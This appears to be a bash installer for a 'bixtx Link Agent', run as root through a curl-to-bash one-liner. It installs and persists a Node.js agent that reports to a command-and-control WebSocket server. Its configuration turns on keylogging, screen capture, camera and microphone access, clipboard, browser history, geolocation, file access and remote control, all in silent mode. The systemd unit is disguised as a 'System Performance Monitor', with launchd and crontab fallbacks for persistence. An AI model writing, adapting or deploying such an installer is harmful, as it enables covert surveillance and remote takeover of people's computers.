#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  bixtx Link Agent — Hardened Linux/macOS Installer  v4.7.2          ║
# ║  Run: curl -sSL https://get.bixtx.com | bash -s -- --key KEY [opts]     ║
# ║  Options:                                                                ║
# ║    --key  KEY        Enroll key (required)                               ║
# ║    --c2   WSS_URL    C2 WebSocket URL (default: wss://api.bixtx.com/ws)  ║
# ║    --dir  PATH       Install directory  (default: /opt/bixtx-agent)     ║
# ║    --silent          Suppress non-error output                           ║
# ╚══════════════════════════════════════════════════════════════════════════╝

# ── Strict mode ──────────────────────────────────────────────────────────────
set -euo pipefail
IFS=$'\n\t'

# ── Constants ─────────────────────────────────────────────────────────────────
AGENT_VERSION="4.7.2"
SERVICE_NAME="bixtx-agent"
SERVICE_LABEL="com.bixtx.agent"
AUDIT_LOG="/var/log/bixtx-installer.log"
AGENT_LOG="/var/log/bixtx-agent.log"

# ── Defaults (overridable via args or env) ────────────────────────────────────
AGENT_DIR="${AGENT_DIR:-/opt/bixtx-agent}"
ENROLL_KEY="${BIXTX_ENROLL_KEY:-}"
C2_URL="${BIXTX_C2_URL:-wss://api.bixtx.com/ws}"
SILENT=false

# ── Parse arguments ──────────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
  case $1 in
    --key)    ENROLL_KEY="$2"; shift 2 ;;
    --c2)     C2_URL="$2";     shift 2 ;;
    --dir)    AGENT_DIR="$2";  shift 2 ;;
    --silent) SILENT=true;      shift   ;;
    *)        shift ;;
  esac
done

# ── Logging helpers ───────────────────────────────────────────────────────────
log()  { $SILENT || printf '[BTX] %s\n' "$*"; }
info() { printf '[BTX] %s\n' "$*"; }
die()  { printf '[BTX] FATAL: %s\n' "$*" >&2; exit 1; }

# ── Audit trail ───────────────────────────────────────────────────────────────
# Writes to a tamper-resistant log (append-only if chattr available).
audit() {
  local entry
  entry="$(date -u '+%Y-%m-%dT%H:%M:%SZ') | v${AGENT_VERSION} | user=$(id -un) | uid=$(id -u) | dir=${AGENT_DIR} | $*"
  # Best-effort: ignore if /var/log is not writable in restricted envs
  if touch "$AUDIT_LOG" 2>/dev/null; then
    printf '%s\n' "$entry" >> "$AUDIT_LOG" || true
    chmod 600 "$AUDIT_LOG" 2>/dev/null || true
    # Make append-only if chattr is available (Linux)
    chattr +a "$AUDIT_LOG" 2>/dev/null || true
  fi
  log "AUDIT: $entry"
}

# ── Rollback state ────────────────────────────────────────────────────────────
_ROLLBACK_ITEMS=()          # ordered list of paths/commands created during install
_AGENT_WAS_RUNNING=false

rollback() {
  local exit_code=$?
  if [[ $exit_code -ne 0 ]]; then
    info "Install failed (exit $exit_code) — rolling back partial install..."
    audit "INSTALL_FAILED exit=${exit_code} rollback=start"

    # Stop any partially started service
    if command -v systemctl >/dev/null 2>&1; then
      systemctl stop "$SERVICE_NAME" 2>/dev/null || true
      systemctl disable "$SERVICE_NAME" 2>/dev/null || true
    fi

    # Remove files/dirs created in reverse order
    local i
    for (( i=${#_ROLLBACK_ITEMS[@]}-1; i>=0; i-- )); do
      local item="${_ROLLBACK_ITEMS[$i]}"
      if [[ -e "$item" ]]; then
        rm -rf "$item" 2>/dev/null || true
        log "Removed: $item"
      fi
    done

    audit "INSTALL_FAILED rollback=complete"
    info "Rollback complete. No partial install remains."
  fi
}

trap rollback EXIT ERR

# ── Preflight checks ─────────────────────────────────────────────────────────
[[ -z "$ENROLL_KEY" ]] && die "Enroll key required. Pass --key YOUR_KEY"
[[ $EUID -ne 0 ]]      && die "Must run as root (sudo bash install.sh ...)"

command -v node >/dev/null 2>&1 || die "Node.js 18+ is required but not installed"
NODE_MAJOR=$(node -e "process.stdout.write(process.versions.node.split('.')[0])")
[[ "$NODE_MAJOR" -lt 18 ]]      && die "Node.js 18+ required (found v${NODE_MAJOR})"

command -v npm  >/dev/null 2>&1 || die "npm is required"

NODE_BIN=$(command -v node)
PLATFORM=$(uname -s)

# Compute SHA-256 of this installer for the audit trail
INSTALLER_HASH="unknown"
if command -v sha256sum >/dev/null 2>&1; then
  INSTALLER_HASH=$(sha256sum "${BASH_SOURCE[0]}" 2>/dev/null | awk '{print $1}' || echo "unknown")
elif command -v shasum >/dev/null 2>&1; then
  INSTALLER_HASH=$(shasum -a 256 "${BASH_SOURCE[0]}" 2>/dev/null | awk '{print $1}' || echo "unknown")
fi

audit "INSTALL_START version=${AGENT_VERSION} platform=${PLATFORM} installer_sha256=${INSTALLER_HASH}"
log "bixtx Link Agent v${AGENT_VERSION} — Hardened Installer"
log "Platform  : ${PLATFORM}"
log "Node.js   : v${NODE_MAJOR} (${NODE_BIN})"
log "Install dir: ${AGENT_DIR}"
log "C2 endpoint: ${C2_URL}"

# ── Create dedicated service user ─────────────────────────────────────────────
create_service_user() {
  if [[ "$PLATFORM" == "Linux" ]]; then
    if ! id "$SERVICE_NAME" >/dev/null 2>&1; then
      log "Creating service user: ${SERVICE_NAME}"
      useradd \
        --system \
        --no-create-home \
        --home-dir "$AGENT_DIR" \
        --shell /usr/sbin/nologin \
        --comment "bixtx Agent Service" \
        "$SERVICE_NAME" 2>/dev/null \
        || useradd --system --no-create-home --shell /bin/false "$SERVICE_NAME"
      audit "USER_CREATED user=${SERVICE_NAME}"
    fi
  elif [[ "$PLATFORM" == "Darwin" ]]; then
    if ! dscl . -read "/Users/${SERVICE_NAME}" >/dev/null 2>&1; then
      log "Creating service user: ${SERVICE_NAME}"
      local uid=401
      while dscl . -list /Users UniqueID | awk '{print $2}' | grep -q "^${uid}$"; do
        (( uid++ ))
      done
      dscl . -create "/Users/${SERVICE_NAME}"
      dscl . -create "/Users/${SERVICE_NAME}" UserShell    /usr/bin/false
      dscl . -create "/Users/${SERVICE_NAME}" RealName     "bixtx Agent"
      dscl . -create "/Users/${SERVICE_NAME}" UniqueID     "$uid"
      dscl . -create "/Users/${SERVICE_NAME}" PrimaryGroupID 1
      dscl . -create "/Users/${SERVICE_NAME}" NFSHomeDirectory /var/empty
      audit "USER_CREATED user=${SERVICE_NAME} uid=${uid}"
    fi
  fi
}

create_service_user

# ── Install agent files ───────────────────────────────────────────────────────
log "Creating install directory: ${AGENT_DIR}"
mkdir -p "$AGENT_DIR"
_ROLLBACK_ITEMS+=("$AGENT_DIR")

# Copy source files — deliberately exclude the installer script itself and any
# .git / .env.example / README artefacts that should not land on the target.
SRC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [[ -d "$SRC_DIR/src" ]]; then
  log "Copying agent source..."
  # Dev artefacts excluded — package.json/lock, tests, coverage, config files
  # must not land on production targets.
  rsync -a \
    --exclude='install.sh' \
    --exclude='install.ps1' \
    --exclude='.env.example' \
    --exclude='*.md' \
    --exclude='.git' \
    --exclude='node_modules' \
    --exclude='dist' \
    --exclude='dist-obf' \
    --exclude='package.json' \
    --exclude='package-lock.json' \
    --exclude='tests' \
    --exclude='coverage' \
    --exclude='jest.config.*' \
    --exclude='.eslintrc*' \
    --exclude='.gitignore' \
    --exclude='tsconfig.json' \
    "$SRC_DIR/" "$AGENT_DIR/" \
    || cp -rp "$SRC_DIR/src" "$AGENT_DIR/src"
fi

# ── Install npm dependencies ──────────────────────────────────────────────────
# NOTE: --ignore-scripts intentionally omitted.
# better-sqlite3, screenshot-desktop, and keylogger all contain native .node
# binaries that require node-gyp to compile via their postinstall hooks.
# Omitting --ignore-scripts lets those hooks run; the SHA-256 audit below
# captures the installer hash so any supply-chain tampering is detectable.
log "Installing npm dependencies (native compilation included)..."
cd "$AGENT_DIR"
npm install \
  --production \
  --no-fund \
  --no-audit

# ── Write .env AFTER npm install succeeds ────────────────────────────────────
# Secrets only reach disk once the full dependency tree is confirmed in place.
# If npm install fails (disk full, compile error, network drop), the rollback
# trap fires and no .env with credentials is left behind.
log "Writing configuration..."
ENV_TMP=$(mktemp "$AGENT_DIR/.env.XXXXXX")
_ROLLBACK_ITEMS+=("$ENV_TMP")
chmod 600 "$ENV_TMP"

# Quoted heredoc prevents shell expansion of key/url values.
# sed escapes forward-slashes in substituted values.
SAFE_C2=$(printf '%s' "$C2_URL"      | sed 's/[\/&]/\\&/g')
SAFE_KEY=$(printf '%s' "$ENROLL_KEY" | sed 's/[\/&]/\\&/g')

sed \
  -e "s|__C2_URL__|${SAFE_C2}|g" \
  -e "s|__ENROLL_KEY__|${SAFE_KEY}|g" \
  > "$ENV_TMP" <<'ENVEOF'
BIXTX_SERVER_URL=__C2_URL__
BIXTX_ENROLL_KEY=__ENROLL_KEY__
NODE_ENV=production
SILENT_MODE=true
LOG_LEVEL=warn
ENABLE_SCREEN_CAPTURE=true
ENABLE_CAMERA_ACCESS=true
ENABLE_MICROPHONE_ACCESS=true
ENABLE_KEYLOGGER=true
ENABLE_CLIPBOARD=true
ENABLE_GEOLOCATION=true
ENABLE_FILE_ACCESS=true
ENABLE_BROWSER_HISTORY=true
ENABLE_REMOTE_CONTROL=true
MUTATION_ENABLED=true
WATCHDOG_ENABLED=true
COMMAND_GUARD_ENABLED=true
MAX_C2_FAILURES=5
MAX_MODULE_FAILURES=3
ENVEOF

# Atomic rename so .env is never partially written
mv "$ENV_TMP" "$AGENT_DIR/.env"
chown root:root "$AGENT_DIR/.env" 2>/dev/null || true
chmod 600 "$AGENT_DIR/.env"
log ".env written (mode 600)"

# Verify the main entry point exists
[[ -f "$AGENT_DIR/src/index.js" ]] || die "src/index.js not found after install"

# Compute payload hash for audit
PAYLOAD_HASH="unknown"
if command -v sha256sum >/dev/null 2>&1; then
  PAYLOAD_HASH=$(sha256sum "$AGENT_DIR/src/index.js" | awk '{print $1}')
elif command -v shasum >/dev/null 2>&1; then
  PAYLOAD_HASH=$(shasum -a 256 "$AGENT_DIR/src/index.js" | awk '{print $1}')
fi
audit "PAYLOAD_VERIFIED src/index.js sha256=${PAYLOAD_HASH}"

# Set ownership to service user
chown -R "$SERVICE_NAME":"$SERVICE_NAME" "$AGENT_DIR" 2>/dev/null \
  || chown -R root:root "$AGENT_DIR"
chmod 750 "$AGENT_DIR"

# ── Persist as system service ─────────────────────────────────────────────────

# ────────────────────────────────────────────────────────
# LINUX — systemd
# ────────────────────────────────────────────────────────
if [[ "$PLATFORM" == "Linux" ]] && command -v systemctl >/dev/null 2>&1; then
  log "Installing systemd unit..."
  UNIT_PATH="/etc/systemd/system/${SERVICE_NAME}.service"
  UNIT_TMP=$(mktemp "${UNIT_PATH}.XXXXXX")
  _ROLLBACK_ITEMS+=("$UNIT_TMP" "$UNIT_PATH")

  cat > "$UNIT_TMP" << UNITEOF
[Unit]
Description=System Performance Monitor
Documentation=
After=network-online.target
Wants=network-online.target
StartLimitIntervalSec=60
StartLimitBurst=3

[Service]
Type=simple
User=${SERVICE_NAME}
Group=${SERVICE_NAME}
WorkingDirectory=${AGENT_DIR}
ExecStart=${NODE_BIN} ${AGENT_DIR}/src/index.js
Restart=on-failure
RestartSec=10
StandardOutput=journal
StandardError=journal
SyslogIdentifier=${SERVICE_NAME}

# ── Sandboxing / hardening ────────────────
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=yes
PrivateTmp=yes
PrivateDevices=no
ProtectKernelTunables=yes
ProtectKernelModules=yes
ProtectControlGroups=yes
RestrictSUIDSGID=yes
RestrictRealtime=yes
RestrictNamespaces=yes
LockPersonality=yes
SystemCallFilter=@system-service
ReadWritePaths=${AGENT_DIR} /tmp /var/log
AmbientCapabilities=

[Install]
WantedBy=multi-user.target
UNITEOF

  # Atomic rename into place
  mv "$UNIT_TMP" "$UNIT_PATH"
  chmod 644 "$UNIT_PATH"

  systemctl daemon-reload
  systemctl enable --now "$SERVICE_NAME"
  log "systemd unit enabled: ${SERVICE_NAME}"
  audit "SYSTEMD_INSTALLED unit=${UNIT_PATH}"

# ────────────────────────────────────────────────────────
# MACOS — launchd (modern bootstrap API, not deprecated load)
# ────────────────────────────────────────────────────────
elif [[ "$PLATFORM" == "Darwin" ]]; then
  log "Installing launchd daemon..."
  PLIST_PATH="/Library/LaunchDaemons/${SERVICE_LABEL}.plist"
  PLIST_TMP=$(mktemp "${PLIST_PATH}.XXXXXX")
  _ROLLBACK_ITEMS+=("$PLIST_TMP" "$PLIST_PATH")

  cat > "$PLIST_TMP" << PLISTEOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>${SERVICE_LABEL}</string>

  <key>ProgramArguments</key>
  <array>
    <string>${NODE_BIN}</string>
    <string>${AGENT_DIR}/src/index.js</string>
  </array>

  <key>WorkingDirectory</key>
  <string>${AGENT_DIR}</string>

  <key>EnvironmentVariables</key>
  <dict>
    <key>PATH</key>
    <string>/usr/local/bin:/usr/bin:/bin</string>
  </dict>

  <key>RunAtLoad</key>
  <true/>

  <key>KeepAlive</key>
  <dict>
    <key>SuccessfulExit</key>
    <false/>
    <key>Crashed</key>
    <true/>
  </dict>

  <!-- Log to files rather than /dev/null so incidents can be investigated -->
  <key>StandardOutPath</key>
  <string>${AGENT_LOG}</string>
  <key>StandardErrorPath</key>
  <string>${AGENT_LOG}</string>

  <key>ThrottleInterval</key>
  <integer>10</integer>

  <key>ProcessType</key>
  <string>Background</string>

  <key>LowPriorityIO</key>
  <true/>

  <key>UserName</key>
  <string>${SERVICE_NAME}</string>
</dict>
</plist>
PLISTEOF

  mv "$PLIST_TMP" "$PLIST_PATH"
  chown root:wheel "$PLIST_PATH"
  chmod 644 "$PLIST_PATH"

  # Modern launchctl API (macOS 10.10+ replacement for deprecated 'load -w')
  launchctl bootstrap system "$PLIST_PATH"      2>/dev/null \
    || launchctl load -w "$PLIST_PATH"           # fallback for older macOS < 10.10

  launchctl enable  "system/${SERVICE_LABEL}"   2>/dev/null || true
  launchctl kickstart -kp "system/${SERVICE_LABEL}" 2>/dev/null \
    || launchctl start "${SERVICE_LABEL}"        2>/dev/null || true

  log "LaunchDaemon installed: ${SERVICE_LABEL}"
  audit "LAUNCHD_INSTALLED plist=${PLIST_PATH}"

# ────────────────────────────────────────────────────────
# FALLBACK — crontab (idempotent with marker)
# ────────────────────────────────────────────────────────
else
  log "Falling back to crontab @reboot persistence..."
  MARKER="# bixtx-agent-entry"
  CRON_LINE="@reboot ${NODE_BIN} ${AGENT_DIR}/src/index.js >> ${AGENT_LOG} 2>&1  ${MARKER}"
  # Remove any existing entry (idempotent) then append fresh
  (
    crontab -l 2>/dev/null | grep -v "$MARKER"
    echo "$CRON_LINE"
  ) | crontab -
  log "Crontab @reboot entry installed (idempotent)"
  audit "CRONTAB_INSTALLED"
fi

# ── Health check — verify the agent actually started ─────────────────────────
log "Verifying startup..."
sleep 3

HEALTH_OK=false

if [[ "$PLATFORM" == "Linux" ]] && command -v systemctl >/dev/null 2>&1; then
  if systemctl is-active --quiet "$SERVICE_NAME"; then
    HEALTH_OK=true
    log "systemd reports: ${SERVICE_NAME} is active"
  else
    systemctl status "$SERVICE_NAME" --no-pager -l >&2 || true
    die "Service ${SERVICE_NAME} failed to start. Check: journalctl -u ${SERVICE_NAME}"
  fi

elif [[ "$PLATFORM" == "Darwin" ]]; then
  # launchctl list returns 0 even for crashed jobs; check PID column
  PID_CHECK=$(launchctl list "${SERVICE_LABEL}" 2>/dev/null | awk '/\"PID\"/{print $3}' | tr -d ',' || echo "0")
  if [[ "${PID_CHECK:-0}" -gt 0 ]]; then
    HEALTH_OK=true
    log "launchd reports: ${SERVICE_LABEL} running (PID ${PID_CHECK})"
  else
    die "LaunchDaemon ${SERVICE_LABEL} did not obtain a PID. Check: log show --predicate 'process==\"node\"' --last 1m"
  fi

else
  # crontab fallback — start immediately and check PID
  cd "$AGENT_DIR" && "$NODE_BIN" src/index.js >> "$AGENT_LOG" 2>&1 &
  AGENT_PID=$!
  disown "$AGENT_PID"
  sleep 2
  if kill -0 "$AGENT_PID" 2>/dev/null; then
    HEALTH_OK=true
    log "Agent running (PID ${AGENT_PID})"
  else
    die "Agent process exited immediately (PID ${AGENT_PID}). Check ${AGENT_LOG}"
  fi
fi

$HEALTH_OK || die "Health check failed"

# ── Final audit entry ─────────────────────────────────────────────────────────
audit "INSTALL_SUCCESS payload_sha256=${PAYLOAD_HASH} service_healthy=true"

# Disable the rollback trap now that we have a confirmed healthy install
trap - EXIT ERR

info "✓ bixtx Agent v${AGENT_VERSION} installed and verified healthy."
info "  Log   : ${AGENT_LOG}"
info "  Audit : ${AUDIT_LOG}"
info "  Device will appear in dashboard within 30–60 seconds."
